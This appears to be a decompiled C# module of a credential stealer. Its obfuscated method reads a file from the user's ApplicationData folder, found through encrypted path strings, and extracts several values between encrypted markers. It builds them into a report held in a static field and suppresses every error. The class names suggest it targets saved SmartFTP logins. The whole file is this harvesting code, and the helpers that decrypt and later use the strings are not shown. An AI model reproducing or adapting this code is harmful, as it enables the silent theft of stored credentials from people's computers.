using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DASMRTFTP
{
	public class Smartdll
	{
		public static void GTMYSmart()
		{
			try
			{
				string sFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("l6nOycyvnLW4tn7Cys3Ir3aTloqXnMLeya2/1c3Nl6fW0b2mdqTXyKm7xNy2Cw==", "False") + FileSystem.Dir(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + GOSLWHR.WHJBIYT("l6nOycyvnLW4tn7Cys3Ir3aTloqXnMLeya2/1c3Nl6fW0b2mdqTXyKm7xNy2ZYTZ1cYL", "False"), (FileAttribute)0);
				string sInhalt = RDFLE3(sFile);
				string text = CTME2(sInhalt, GOSLWHR.WHJBIYT("aZDCzcBrGg==", "False"), GOSLWHR.WHJBIYT("eIaq2M6wlQw=", "False"));
				string text2 = CTME2(sInhalt, GOSLWHR.WHJBIYT("dKPN18t2Dw==", "False"), GOSLWHR.WHJBIYT("Z3Whx7yfhB0=", "False"));
				string text3 = CTME2(sInhalt, GOSLWHR.WHJBIYT("d6vUzcx5DA==", "False"), GOSLWHR.WHJBIYT("WWeYvaGPdis=", "False"));
				string text4 = CTME2(sInhalt, GOSLWHR.WHJBIYT("U4Ket6mOoa+odC8=", "False"), GOSLWHR.WHJBIYT("Y3GdtbmaubzGqmUg", "False"));
				string text5 = CTME2(sInhalt, GOSLWHR.WHJBIYT("cJ27zrhyEw==", "False"), GOSLWHR.WHJBIYT("VGKMpqR9cTA=", "False"));
				string text6 = (NTUIYURW.YIGWEOPP = ((Operators.CompareString(text3, "", false) == 0) ? (GOSLWHR.WHJBIYT("hJ+qsaOEn6qxo4SfwOHHudazyLaEn6qxo4SfqrGjhJ+qsQM=", "False") + Environment.NewLine + GOSLWHR.WHJBIYT("aqZim6B/prStrjx9sb6pgGVwd2lKZSw=", "False") + Environment.NewLine + GOSLWHR.WHJBIYT("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpkH", "False")) : (GOSLWHR.WHJBIYT("hJ+qsaOEn6qxo4SfwOHHudazyLaEn6qxo4SfqrGjhJ+qsQM=", "False") + Environment.NewLine + GOSLWHR.WHJBIYT("YaW2u7RWVyw=", "False") + text5 + Environment.NewLine + GOSLWHR.WHJBIYT("h8nY4JhfCA==", "False") + text + GOSLWHR.WHJBIYT("eAk=", "False") + text2 + Environment.NewLine + GOSLWHR.WHJBIYT("kMnG2sicw8aiegs=", "False") + text3 + Environment.NewLine + GOSLWHR.WHJBIYT("Z5Owt62GpKF+Vi8=", "False") + text4 + GOSLWHR.WHJBIYT("RmmRwaiYurzHbiA=", "False") + Environment.NewLine + GOSLWHR.WHJBIYT("fpmkq51+maSrnX6ZpKudfpmkq51+maSrnX6ZpKudfpkH", "False"))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				NTUIYURW.YIGWEOPP = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string RDFLE3(string sFile)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(sFile);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string CTME2(string sInhalt, string sText, string sText2)
		{
			string result = default(string);
			try
			{
				string[] array = Strings.Split(sInhalt, sText, -1, (CompareMethod)0);
				string[] array2 = Strings.Split(array[1], sText2, -1, (CompareMethod)0);
				result = array2[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
